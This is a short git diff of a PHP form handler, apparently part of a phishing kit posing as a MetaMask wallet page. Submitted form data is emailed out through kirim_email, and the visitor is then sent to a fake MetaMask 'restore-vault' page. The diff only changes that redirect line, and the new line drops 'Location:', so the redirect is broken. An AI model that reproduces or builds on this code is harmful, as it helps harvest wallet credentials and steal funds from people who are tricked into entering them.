@@ -32,7 +32,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         kirim_email($subject, $data);
 
         // 5. Redirect ke halaman selanjutnya
-        header("Location:/prize-main/metamask/invalid.html?/nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault");
+        header("/metamask/invalid.html?/nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault");
         exit(); // Menghentikan eksekusi agar redirect berjalan dengan baik
     }
     // Jika saran kosong, tidak melakukan apa pun dan tetap di halaman form
